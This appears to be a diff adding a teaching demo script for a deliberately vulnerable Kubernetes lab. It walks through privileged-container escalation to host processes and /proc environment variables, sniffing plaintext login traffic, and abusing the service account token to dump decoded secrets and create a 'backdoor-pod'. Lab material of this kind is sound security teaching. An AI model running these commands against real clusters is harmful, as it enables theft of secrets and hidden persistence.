@@ -1,0 +1,129 @@
+
+export VULN_POD=$(kubectl get pod -n vulnerable-app \
+  -l app=vulnerable-app \
+  -o jsonpath='{.items[0].metadata.name}')
+
+echo $VULN_POD
+
+
+──────────────────────────────────────────────────────────────────────────────
+  DEMO 1 — Privileged Container → Host Privilege Escalation
+──────────────────────────────────────────────────────────────────────────────
+
+  STEP 1 — Confirm the container runs as root
+  ────────────────────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- whoami
+  kubectl exec -n vulnerable-app $VULN_POD -- id
+
+
+  STEP 2 — See host block devices (privileged: true)
+  ───────────────────────────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- ls /dev/ | head -20
+
+  STEP 3 — Read ALL host processes (hostPID: true)
+  ─────────────────────────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- ps aux | head -20
+
+  STEP 4 — Read host environment variables via /proc
+  ───────────────────────────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- \
+    cat /proc/1/environ | tr '\0' '\n' | head -20
+
+
+──────────────────────────────────────────────────────────────────────────────
+  DEMO 2 — Plaintext Traffic Sniffing
+──────────────────────────────────────────────────────────────────────────────
+
+  STEP 1 — Show what the backend sends in plaintext
+  ───────────────────────────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- \
+    wget -qO- http://backend-api.vulnerable-app.svc.cluster.local:8080/api/login
+
+
+  STEP 2 — Start the sniffer on sniffer-pod (TERMINAL 1)
+  ────────────────────────────────────────────────────────
+  kubectl exec -n vulnerable-app sniffer-pod -- \
+    tcpdump -l -i cni0 -A -s0 tcp port 8080
+
+
+  STEP 3 — Trigger the credential request (TERMINAL 2, while Terminal 1 runs)
+  ──────────────────────────────────────────────────────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- \
+    wget -qO- http://backend-api.vulnerable-app.svc.cluster.local:8080/api/login
+
+
+──────────────────────────────────────────────────────────────────────────────
+  DEMO 3 — Default ServiceAccount Token Abuse
+──────────────────────────────────────────────────────────────────────────────
+
+  STEP 1 — Show the auto-mounted token
+  ─────────────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- \
+    ls /var/run/secrets/kubernetes.io/serviceaccount/
+
+  kubectl exec -n vulnerable-app $VULN_POD -- \
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+
+  STEP 2 — Decode the token
+  ──────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- sh -c '
+    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+    PAYLOAD=$(echo $TOKEN | cut -d. -f2)
+    python3 -c "
+import base64, json, sys
+raw = sys.argv[1]
+padded = raw + (\"=\" * (4 - len(raw) % 4))
+print(json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2))
+" "$PAYLOAD"
+  '
+
+  STEP 3 — List all namespaces via the K8s API
+  ─────────────────────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- sh -c '
+    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+    CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+    curl -sk --cacert $CACERT \
+      -H "Authorization: Bearer $TOKEN" \
+      https://kubernetes.default.svc/api/v1/namespaces \
+      | python3 -c "
+import json,sys
+data=json.load(sys.stdin)
+[print(\"  - \" + n[\"metadata\"][\"name\"]) for n in data.get(\"items\",[])]
+"
+  '
+
+  STEP 4 — Read secrets
+  ──────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- sh -c '
+    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+    CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+    curl -sk --cacert $CACERT \
+      -H "Authorization: Bearer $TOKEN" \
+      https://kubernetes.default.svc/api/v1/namespaces/vulnerable-app/secrets \
+      | python3 -c "
+import json,sys,base64
+data=json.load(sys.stdin)
+for s in data.get(\"items\",[]):
+    print(\"SECRET: \" + s[\"metadata\"][\"name\"])
+    for k,v in s.get(\"data\",{}).items():
+        print(\"  \" + k + \" = \" + base64.b64decode(v).decode())
+"
+  '
+
+
+  STEP 5 — Deploy a backdoor pod
+  ───────────────────────────────
+  kubectl exec -n vulnerable-app $VULN_POD -- sh -c '
+    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+    CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+    curl -sk --cacert $CACERT \
+      -H "Authorization: Bearer $TOKEN" \
+      -H "Content-Type: application/json" \
+      -X POST \
+      https://kubernetes.default.svc/api/v1/namespaces/vulnerable-app/pods \
+      -d "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"backdoor-pod\"},\"spec\":{\"containers\":[{\"name\":\"backdoor\",\"image\":\"busybox\",\"command\":[\"sleep\",\"infinity\"]}]}}"
+  '
+
+  kubectl get pods -n vulnerable-app
+
